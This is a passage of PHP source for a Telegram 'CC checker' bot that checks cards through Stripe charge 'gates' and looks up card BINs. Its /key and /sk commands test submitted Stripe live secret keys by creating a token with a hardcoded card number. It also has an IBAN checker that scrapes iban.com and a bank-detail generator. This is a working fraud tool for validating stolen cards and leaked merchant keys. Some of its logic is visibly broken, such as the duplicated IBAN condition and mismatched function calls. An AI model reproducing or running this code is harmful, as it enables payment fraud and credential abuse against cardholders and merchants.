                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  𝘾𝙖𝙧𝙙 Number Is Incorrect</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>$time 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                else {
                sendMessage($chatId, "<b><u><i>Unknown Error. $msg1 - $msg2</i></u></b>", $message_id);
                };
                }
        
        elseif ((strpos($message, "/cmds") === 0)||(strpos($message, "!cmds") === 0)||(strpos($message, "!command") === 0)||(strpos($message, "!commands") === 0)||(strpos($message, "/commands") === 0)||(strpos($message, "/command") === 0)||(strpos($message, "/cmd") === 0)){
        sendMessage($chatId, "<b>🅽🆃🅼 🅲🅲 🅲🅷🅺%0A%0A『 ★ 𝐆𝐀𝐓𝐄𝐒 ★ 』%0D%0A╔══════════════════════════%0A╟➣𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 <b>$1</b> ➣ /usd or /chk %0A╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣ ON✅%0A╟═══════════════════%0A╟➣𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 <b>$5</b> ➣ /chk5%0A╟➣𝙎𝙩𝙖𝙩𝙪𝙨 ➣ ON✅%0A╟═══════════════════ %0A╟➣𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 ₹𝟏𝟎𝟎 ➣ /inr %0A╟➣𝙎𝙩𝙖𝙩𝙪𝙨 ➣ ON✅%0A╟═══════════════════%0A╟➣𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 ₹𝟒𝟓 ➣ /inr45 %0A╟➣𝙎𝙩𝙖𝙩𝙪𝙨 ➣ ON✅%0A╟═══════════════════%0A╟➣𝐁𝐈𝐍 𝐋𝐎𝐎𝐊𝐔𝐏 ➣ /bin %0A╟➣𝙎𝙩𝙖𝙩𝙪𝙨 ➣ ON✅%0A╟═══════════════════ %0A╟➣𝐒𝐊 𝐂𝐇𝐄𝐂𝐊 ➣ /sk %0A╟➣𝙎𝙩𝙖𝙩𝙪𝙨 ➣ ON✅%0A╟═══════════════════%0A╟➣Free Access【🅽🆃🅼】@NTMchat%0A╟═══════════════════%0A╟➣𝐁𝐨𝐭 𝐛𝐲 @abdul97233%0A╟═══════════════════ %0A╟➣𝐓𝐨 𝐤𝐧𝐨𝐰 𝐲𝐨𝐮𝐫 𝐢𝐝 ➣ /id%0A╚══════════════════════════</b>", $message_id);
        }
        
        
        //////////=========[Bin Command]=========//////////
        
        elseif ((strpos($message, "/bin") === 0)||(strpos($message, "!bin") === 0)||(strpos($message, ".bin") === 0)){
                $bin = substr($message, 5);
                if (!empty($bin)) {
                $ch = curl_init();
                 curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
                curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'Host: lookup.binlist.net',
                'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, '');
                $fim = curl_exec($ch);
                $bank = GetStr($fim, '"bank":{"name":"', '"');
                $name = GetStr($fim, '"name":"', '"');
                $brand = GetStr($fim, '"brand":"', '"');
                $country = GetStr($fim, '"country":{"name":"', '"');
                $emoji = GetStr($fim, '"emoji":"', '"');
                $scheme = GetStr($fim, '"scheme":"', '"');
                $info = curl_getinfo($ch);
                $time = $info['total_time'];
                $httpCode = $info['http_code'];
                 $time = substr($time, 0, 4);
                $type = GetStr($fim, '"type":"', '"');
                if(strpos($fim, '"type":"credit"') !== false){
                $bin = 'Credit';
                }else{
                $bin = 'Debit';
                };
                sendMessage($chatId, '<b>%0A╔══════════════════════════%0A╟➣『 ★ 𝓥𝓐𝓛𝓘𝓓 𝓑𝓘𝓝 ✅ ★ 』</b>%0A<b>╟➣ 𝗕𝗮𝗻𝗸 ➣ </b> '.$bank.'%0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣ </b> '.$name.''.$emoji.'%0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> '.$brand.'%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> '.$scheme.'%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣ </b> '.$type.'%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>'.$time.' 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟══════════════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @'.$usernam.'<b>%0A╟══════════════════════════%0A╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>', $message_id);
                }
        else {
        sendMessage($chatId, '<b>❌ Invalid Bin%0AFormat - /bin xxxxxx</b>', $message_id);
        }
        }
        elseif (strpos($message, "/key") === 0){
                $sec = substr($message, 5);
                if (!empty($sec)) {
                $skhidden = substr_replace($sec, '',12).preg_replace("/(?!^).(?!$)/", "x", substr($sec, 12));
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
                curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]=4912461004526326&card[exp_month]=04&card[exp_year]=2024&card[cvc]=011');
                $result = curl_exec($ch);
                $response = trim(strip_tags(GetStr($result,'"message": "','"')));
                if (strpos($result, 'tok_')){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣『 ★ LIVE 𝐊𝐄𝐘 ✅ ★ 』</b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$skhidden</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> 𝐒𝐊 𝐋𝐈𝐕𝐄!!%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
                }
                elseif (strpos($result, 'Invalid API Key provided')){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟『 ★ 𝐃𝐄𝐀𝐃 𝐊𝐄𝐘 ❌ ★ 』</b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$sec</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> 𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐊𝐄𝐘%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
                }
                elseif (strpos($result, 'You did not provide an API key.')){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟『 ★ 𝐃𝐄𝐀𝐃 𝐊𝐄𝐘 ❌ ★ 』</b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$sec</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> 𝐍𝐨 𝐒K 𝐊𝐞𝐲 𝐏𝐫𝐨𝐯𝐢𝐝𝐞𝐝%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
                }
                elseif (strpos($result, 'rate_limit')){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟『 ★ 𝐃𝐄𝐀𝐃 𝐊𝐄𝐘 ⚠️ ★ 』</b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$sec</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> 𝐑𝐚𝐭𝐞 𝐋𝐢𝐦𝐢𝐭𝐞𝐝 𝐊𝐞𝐲%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
                }
                elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟『 ★ 𝐃𝐄𝐀𝐃 𝐊𝐄𝐘 ❌ ★ 』</b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$sec</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> 𝐓𝐞𝐬𝐭𝐦𝐨𝐝𝐞 𝐂𝐡𝐚𝐫𝐠𝐞𝐬 𝐎𝐧𝐥𝐲%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
                }
                elseif (strpos($result, 'api_key_expired')){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟『 ★ 𝐃𝐄𝐀𝐃 𝐊𝐄𝐘 ❌ ★ 』</b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$sec</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> 𝐀𝐩𝐢 𝐊𝐞𝐲 𝐄𝐱𝐩𝐢𝐫𝐞𝐝%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
                }
                else{
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟『 ★ 𝐃𝐄𝐀𝐃 𝐊𝐄𝐘 ❌ ★ 』</b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$skhidden</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> Unknown Error.%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
                }
                }
                else {
                sendMessage($chatId, '<b>%0A╔══════════════════════════%0A╟『 ★ 𝐍𝐨 𝐒𝐤 𝐏𝐫𝐨𝐯𝐢𝐝𝐞𝐝 ❌ ★ 』%0AFormat - /key sk_live_xxx</b>%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @'.$usernam.' %0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>', $message_id);
                }
                delMessage($chatId, $message_id);
                ;}
                elseif (strpos($message, "/sk") === 0){
                $sec = substr($message, 4);
                if (!empty($sec)) {
                $skhidden = substr_replace($sec, '',12).preg_replace("/(?!^).(?!$)/", "x", substr($sec, 12));
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
                curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]=4912461004526326&card[exp_month]=04&card[exp_year]=2024&card[cvc]=011');
                $result = curl_exec($ch);
                $response = trim(strip_tags(GetStr($result,'"message": "','"')));
                if (strpos($result, 'tok_')){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟『 ★ LIVE 𝐊𝐄𝐘 ✅ ★ 』</b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$skhidden</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> 𝐒𝐊 𝐋𝐈𝐕𝐄!!%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
                }
                elseif (strpos($result, 'Invalid API Key provided')){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟『 ★ 𝐃𝐄𝐀𝐃 𝐊𝐄𝐘 ❌ ★ 』</b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$sec</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> 𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐊𝐄𝐘%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
                }
                elseif (strpos($result, 'You did not provide an API key.')){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟『 ★ 𝐃𝐄𝐀𝐃 𝐊𝐄𝐘 ❌ ★ 』</b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$sec</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> 𝐍𝐨 𝐒K 𝐊𝐞𝐲 𝐏𝐫𝐨𝐯𝐢𝐝𝐞𝐝%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
                }
                elseif (strpos($result, 'rate_limit')){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟『 ★ 𝐃𝐄𝐀𝐃 𝐊𝐄𝐘 ⚠️ ★ 』 </b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$sec</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> 𝐑𝐚𝐭𝐞 𝐋𝐢𝐦𝐢𝐭𝐞𝐝 𝐊𝐞𝐲%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
                }
                elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟『 ★ 𝐃𝐄𝐀𝐃 𝐊𝐄𝐘 ❌ ★ 』</b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$sec</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> 𝐓𝐞𝐬𝐭𝐦𝐨𝐝𝐞 𝐂𝐡𝐚𝐫𝐠𝐞𝐬 𝐎𝐧𝐥𝐲%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
                }
                elseif (strpos($result, 'api_key_expired')){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟『 ★ 𝐃𝐄𝐀𝐃 𝐊𝐄𝐘 ❌ ★ 』</b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$sec</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> 𝐀𝐩𝐢 𝐊𝐞𝐲 𝐄𝐱𝐩𝐢𝐫𝐞𝐝%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
                }
                else{
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟『 ★ 𝐃𝐄𝐀𝐃 𝐊𝐄𝐘 ❌ ★ 』 </b>%0A<u>╟➣ 𝐊𝐄𝐘 ➣</u> <code>$skhidden</code>%0A<u>╟➣ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➣</u> Unknown Error.%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @$usernam%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
                }
                }
                else {
                sendMessage($chatId, '<b>%0A╔═══════════════════%0A╟『 ★ 𝐍𝐨 𝐒𝐤 𝐏𝐫𝐨𝐯𝐢𝐝𝐞𝐝 ❌ ★ 』%0AFormat - /sk sk_live_xxxxxxxxxxx</b>%0A<u>╟➣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➣ </u> @'.$usernam.'%0A<b>╟➣ 𝐁𝐨𝐭 𝐁𝐲 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>', $message_id);
                }
                delMessage($chatId, $message_id);
                ;}
                
///////////////
if(strpos($message, "/ichk")===0 or strpos($message, "!ichk")===0 or strpos($message, ".ichk")===0){
sendMessage($chatId,"<b>GIVE ME A  IBAN %0AEX: <code>!ichk DE72733692640414834879</code></b>", $message_id);
  $iban = substr($message, 6);
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.iban.com/iban-checker');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: www.iban.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Referer: https://www.iban.com/iban-checker';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://www.iban.com';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'TE: Trailers';
$headers[] =  'x-requested-with: XMLHttpRequest';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'iban='.$iban.'');
$result = curl_exec($ch);


#----------------------------------------------------------------- [RESPONSES] ------------------------------------------------------------------#

if
(strpos($result,  '<i class="fa fa-check green"></i> <strong>')) {
  sendMessage($chatId,$message_id,$keyboard,"IBAN VALID✅");
}

if
(strpos($result,  '<i class="fa fa-check green"></i> <strong>')) {
 sendMessage($chatId,$message_id,$keyboard,"IBAN NOT VALID❎");
// echo "<span class='badge badge-pink'>Decoder</span><br>"; 
}
curl_close($ch);

if(strpos($message, "/iban")===0 or strpos($message, "!iban")===0 or strpos($message, ".iban")===0){
sendMessage($chatId,$message_id );
$get = file_get_contents('https://random-data-api.com/api/bank/random_bank');
$get = strtoupper($get);
preg_match_all("(\"account_number\":\"(.*)\")siU", $get, $matches1);
$num = $matches1[1][0];
preg_match_all("(\"iban\":\"(.*)\")siU", $get, $matches1);
$iban = $matches1[1][0];
preg_match_all("(\"bank_name\":\"(.*)\")siU", $get, $matches1);
$bank_name = $matches1[1][0];
preg_match_all("(\"routing_number\":\"(.*)\")siU", $get, $matches1);
$rnum = $matches1[1][0];
preg_match_all("(\"swift_bic\":\"(.*)\")siU", $get, $matches1);
$swift = $matches1[1][0];
$respo = urlencode("<b>═════════ 『 NTM 』═════════
•• IBAN GENERATOR
• IBAN: <code>$iban</code>
• ACCOUNT NUMBER: <code>$num</code>
• BANK NAME: <code>$bank_name</code>
• ROUTING NUMBER: <code>$rnum</code>
• SWIFT BIC: <code>$swift</code>
••• BOT BY: @abdul97233</b>");
sendMessage($chatId,$message_id,$keyboard,$respo);
}


foreach (glob("classes/*.php") as $filename)
{
    require_once $filename;
}

//////////////////////////////////////////////////////////////

function sendMessage ($chatId, $message, $message_id){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);
};
function delMessage ($chatId, $message_id){
$url = $GLOBALS[website]."/deleteMessage?chat_id=".$chatId."&message_id=".$message_id."";
file_get_contents($url);
};

function editMessage($chatId, $message, $messageId) {

$url = $GLOBALS[website]."/editMessageText?chat_id=".$chatId."&message_id=".$messageId."&text=".urlencode($message);
file_get_contents($url);

}
